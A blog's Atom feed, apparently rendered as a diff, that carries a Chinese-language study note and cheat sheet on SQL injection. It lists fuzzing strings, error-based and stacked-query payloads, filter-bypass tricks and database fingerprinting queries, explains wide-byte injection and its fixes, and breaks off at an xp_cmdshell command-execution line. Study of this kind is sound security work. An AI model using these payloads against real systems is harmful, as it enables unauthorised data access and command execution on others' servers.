@@ -1,0 +1,891 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://mobius-0.github.io</id>
+    <title>Khala • Posts by &#34;sql注入&#34; tag</title>
+    <link href="https://mobius-0.github.io" />
+    <updated>2022-11-26T03:05:09.000Z</updated>
+    <category term="Hexo" />
+    <category term="shoya" />
+    <category term="网站" />
+    <category term="网络安全" />
+    <category term="工具" />
+    <category term="虚拟机" />
+    <category term="星际争霸2" />
+    <category term="平衡" />
+    <category term="杂谈" />
+    <category term="小说" />
+    <category term="江南" />
+    <category term="龙族" />
+    <category term="动画" />
+    <category term="法律法规" />
+    <category term="域名" />
+    <category term="DNS" />
+    <category term="WEB" />
+    <category term="HTTP" />
+    <category term="计算机网络" />
+    <category term="IPSec" />
+    <category term="VPN" />
+    <category term="SSL" />
+    <category term="TLS" />
+    <category term="WiFi" />
+    <category term="邮件" />
+    <category term="网络协议" />
+    <category term="Linux" />
+    <category term="渗透" />
+    <category term="信息收集" />
+    <category term="痕迹清理" />
+    <category term="Windows" />
+    <category term="ASP" />
+    <category term="CSharp" />
+    <category term="Golang" />
+    <category term="Java" />
+    <category term="语言" />
+    <category term="反序列化" />
+    <category term="混淆" />
+    <category term="沙箱" />
+    <category term="类" />
+    <category term="JDK" />
+    <category term="JavaScript" />
+    <category term="PHP" />
+    <category term="PowerShell" />
+    <category term="Python" />
+    <category term="Ruby" />
+    <category term="Shell" />
+    <category term="漏洞" />
+    <category term="CSRF" />
+    <category term="服务器" />
+    <category term="SQL注入" />
+    <category term="SSRF" />
+    <category term="Cache" />
+    <category term="XSS" />
+    <category term="XXE" />
+    <category term="XML" />
+    <category term="Xpath" />
+    <category term="注入" />
+    <category term="函数" />
+    <category term="绕过" />
+    <category term="遍历" />
+    <category term="包含" />
+    <category term="文件" />
+    <category term="目录" />
+    <category term="读取" />
+    <category term="上传" />
+    <category term="中间件" />
+    <category term="IIS" />
+    <category term="Apache" />
+    <category term="Nginx" />
+    <category term="逻辑" />
+    <category term="策略配置" />
+    <category term="端口" />
+    <category term="社会工程学" />
+    <category term="搜索" />
+    <entry>
+        <id>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/</id>
+        <title>SQL注入</title>
+        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/"/>
+        <content type="html">&lt;h1 id=&#34;注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入分类&#34;&gt;#&lt;/a&gt; 注入分类&lt;/h1&gt;
+&lt;h2 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
+&lt;p&gt;SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。&lt;/p&gt;
+&lt;h2 id=&#34;按技巧分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按技巧分类&#34;&gt;#&lt;/a&gt; 按技巧分类&lt;/h2&gt;
+&lt;p&gt;根据使用的技巧，SQL 注入类型可分为&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;盲注&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;布尔盲注：只能从应用返回中推断语句执行后的布尔值&lt;/li&gt;
+&lt;li&gt;时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;报错注入：应用会显示全部或者部分的报错信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;堆叠注入：有的应用可以加入  &lt;code&gt;;&lt;/code&gt;  后一次执行多条语句&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;其他&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;按获取数据的方式分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#按获取数据的方式分类&#34;&gt;#&lt;/a&gt; 按获取数据的方式分类&lt;/h2&gt;
+&lt;p&gt;另外也可以根据获取数据的方式分为 3 类&lt;/p&gt;
+&lt;h3 id=&#34;inband&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inband&#34;&gt;#&lt;/a&gt; inband&lt;/h3&gt;
+&lt;p&gt;利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。&lt;/p&gt;
+&lt;h3 id=&#34;inference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inference&#34;&gt;#&lt;/a&gt; inference&lt;/h3&gt;
+&lt;p&gt;通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。&lt;/p&gt;
+&lt;h3 id=&#34;out-of-band-oob&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#out-of-band-oob&#34;&gt;#&lt;/a&gt; out of band (OOB)&lt;/h3&gt;
+&lt;p&gt;通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。&lt;/p&gt;
+&lt;h1 id=&#34;注入检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注入检测&#34;&gt;#&lt;/a&gt; 注入检测&lt;/h1&gt;
+&lt;h2 id=&#34;常见的注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的注入点&#34;&gt;#&lt;/a&gt; 常见的注入点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;GET/POST/PUT/DELETE 参数&lt;/li&gt;
+&lt;li&gt;X-Forwarded-For&lt;/li&gt;
+&lt;li&gt;文件名&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;fuzz注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuzz注入点&#34;&gt;#&lt;/a&gt; Fuzz 注入点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  /  &lt;code&gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1/1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1/0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;and 1=1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;quot; and &amp;quot;1&amp;quot;=&amp;quot;1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;and 1=2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;or 1=1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;or 1=&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;+&lt;/code&gt;   &lt;code&gt;-&lt;/code&gt;   &lt;code&gt;^&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;   &lt;code&gt;%&lt;/code&gt;   &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;   &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;   &lt;code&gt;||&lt;/code&gt;   &lt;code&gt;|&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;反引号执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;测试用常量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用常量&#34;&gt;#&lt;/a&gt; 测试用常量&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@@servername&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@@language&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@@spid&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;测试列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试列数&#34;&gt;#&lt;/a&gt; 测试列数&lt;/h2&gt;
+&lt;p&gt;例如  &lt;code&gt;http://www.foo.com/index.asp?id=12+union+select+null,null--&lt;/code&gt;  ，不断增加  &lt;code&gt;null&lt;/code&gt;  至不返回&lt;/p&gt;
+&lt;h2 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select 1/0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;extractvalue(1, concat(0x5c,(select user())))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;updatexml(0x3a,concat(1,(select user())),1)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;exp(~(SELECT * from(select user())a))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ST_LatFromGeoHash((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GTID_SUBSET(version(), 1)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;基于geometric的报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于geometric的报错注入&#34;&gt;#&lt;/a&gt; 基于 geometric 的报错注入&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;GeometryCollection((select * from (select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;polygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;multipoint((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;multilinestring((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;LINESTRING((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;multipolygon((select * from(select * from(select user())a)b))&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==&#34;&gt;commit 95825f&lt;/span&gt; 。&lt;/p&gt;
+&lt;p&gt;而以上列表中基于 geometric 的报错注入在这个 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==&#34;&gt;commit 5caea4&lt;/span&gt; 中被修复，在 5.5.x 较后的版本中同样不再生效。&lt;/p&gt;
+&lt;h2 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;;select 1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;注释符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释符&#34;&gt;#&lt;/a&gt; 注释符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/*xxx*/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/*!xxx*/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/*!50000xxx*/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;判断过滤规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断过滤规则&#34;&gt;#&lt;/a&gt; 判断过滤规则&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;是否有 trunc&lt;/li&gt;
+&lt;li&gt;是否过滤某个字符&lt;/li&gt;
+&lt;li&gt;是否过滤关键字&lt;/li&gt;
+&lt;li&gt;slash 和编码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;获取信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取信息&#34;&gt;#&lt;/a&gt; 获取信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;判断数据库类型&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;and exists (select * from msysobjects ) &amp;gt; 0&lt;/code&gt;  access 数据库&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;and exists (select * from sysobjects ) &amp;gt; 0&lt;/code&gt;  SQLServer 数据库&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;判断数据库表&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;and exsits (select * from admin)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;版本、主机名、用户名、库名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;表和字段&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;确定字段数&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Order By&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Select Into&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;表名、列名&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;测试权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试权限&#34;&gt;#&lt;/a&gt; 测试权限&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;文件操作
+&lt;ul&gt;
+&lt;li&gt;读敏感文件&lt;/li&gt;
+&lt;li&gt;写 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;带外通道
+&lt;ul&gt;
+&lt;li&gt;网络请求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h1&gt;
+&lt;h2 id=&#34;udf提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#udf提权&#34;&gt;#&lt;/a&gt; UDF 提权&lt;/h2&gt;
+&lt;p&gt;UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。&lt;/p&gt;
+&lt;p&gt;当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。&lt;/p&gt;
+&lt;h1 id=&#34;数据库检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库检测&#34;&gt;#&lt;/a&gt; 数据库检测&lt;/h1&gt;
+&lt;h2 id=&#34;mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql&#34;&gt;#&lt;/a&gt; MySQL&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;sleep  &lt;code&gt;sleep(1)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;benchmark  &lt;code&gt;BENCHMARK(5000000, MD5(&#39;test&#39;))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;字符串连接
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT &#39;a&#39; &#39;b&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;version
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;识别用函数
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;connection_id()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;last_insert_id()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;row_count()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;oracle&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle&#34;&gt;#&lt;/a&gt; Oracle&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;字符串连接
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&#39;a&#39;||&#39;oracle&#39; --&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT CONCAT(&#39;some&#39;,&#39;string&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;version
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT banner FROM v$version WHERE rownum=1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;sqlserver&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlserver&#34;&gt;#&lt;/a&gt; SQLServer&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;WAITFOR  &lt;code&gt;WAITFOR DELAY &#39;00:00:10&#39;;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;SERVERNAME  &lt;code&gt;SELECT @@SERVERNAME&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;version  &lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;字符串连接
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT &#39;some&#39;+&#39;string&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;常量
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@@pack_received&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@@rowcount&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;postgresql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgresql&#34;&gt;#&lt;/a&gt; PostgreSQL&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;sleep  &lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;编码绕过&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;大小写&lt;/li&gt;
+&lt;li&gt;url 编码&lt;/li&gt;
+&lt;li&gt;html 编码&lt;/li&gt;
+&lt;li&gt;十六进制编码&lt;/li&gt;
+&lt;li&gt;unicode 编码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;注释&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;//&lt;/code&gt;   &lt;code&gt;--&lt;/code&gt;   &lt;code&gt;-- +&lt;/code&gt;   &lt;code&gt;-- -&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;   &lt;code&gt;/**/&lt;/code&gt;   &lt;code&gt;;%00&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;内联注释用的更多，它有一个特性  &lt;code&gt;/!**/&lt;/code&gt;  只有 MySQL 能识别&lt;/li&gt;
+&lt;li&gt;e.g.  &lt;code&gt;index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;只过滤了一次时&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;union&lt;/code&gt;  =&amp;gt;  &lt;code&gt;ununionion&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;相同功能替换&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;函数替换
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;substring&lt;/code&gt;  /  &lt;code&gt;mid&lt;/code&gt;  /  &lt;code&gt;sub&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ascii&lt;/code&gt;  /  &lt;code&gt;hex&lt;/code&gt;  /  &lt;code&gt;bin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;benchmark&lt;/code&gt;  /  &lt;code&gt;sleep&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;变量替换
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;user()&lt;/code&gt;  /  &lt;code&gt;@@user&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;符号和关键字
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;and&lt;/code&gt;  / `&amp;amp;``&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;or&lt;/code&gt;  /  &lt;code&gt;|&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;HTTP 参数&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;HTTP 参数污染
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;id=1&amp;amp;id=2&amp;amp;id=3&lt;/code&gt;  根据容器不同会有不同的结果&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;HTTP 分割注入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;缓冲区溢出&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;sql注入小技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入小技巧&#34;&gt;#&lt;/a&gt; SQL 注入小技巧&lt;/h1&gt;
+&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h2&gt;
+&lt;p&gt;一般程序员用 gbk 编码做开发的时候，会用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  来设定，这句话等同于&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;set
+character_set_connection = &#39;gbk&#39;,
+character_set_result = &#39;gbk&#39;,
+character_set_client = &#39;gbk&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;漏洞发生的原因是执行了  &lt;code&gt;set character_set_client = &#39;gbk&#39;;&lt;/code&gt;  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  &lt;code&gt;set names &#39;gbk&#39;&lt;/code&gt;  的话 real_escape 是不知道设置的数据的编码的，就会加  &lt;code&gt;%5c&lt;/code&gt;  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。&lt;/p&gt;
+&lt;p&gt;解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  &lt;code&gt;mysql_set_charset(&#39;gbk&#39;)&lt;/code&gt;  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。&lt;/p&gt;
+&lt;p&gt;还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。&lt;/p&gt;
+&lt;h1 id=&#34;cheatsheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet&#34;&gt;#&lt;/a&gt; CheatSheet&lt;/h1&gt;
+&lt;h2 id=&#34;sql-server-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-server-payload&#34;&gt;#&lt;/a&gt; SQL Server Payload&lt;/h2&gt;
+&lt;h3 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Version&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT @@version&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;Edition&#39;);&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT SERVERPROPERTY(&#39;EngineEdition&#39;);&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Comment&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT 1 -- comment&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Space&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0x01 - 0x20&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT user_name()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;``SELECT system_user`&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户权限&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select IS_SRVROLEMEMBER(&#39;db_owner&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;List User&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SELECT name FROM master..syslogins&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数据库信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SELECT name FROM master..sysdatabases&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select concat_ws(table_schema,table_name,column_name) from information_schema.columns&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;执行命令&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;EXEC xp_cmdshell &#39;net user&#39;&lt;/code&gt;&lt;/li&gt;
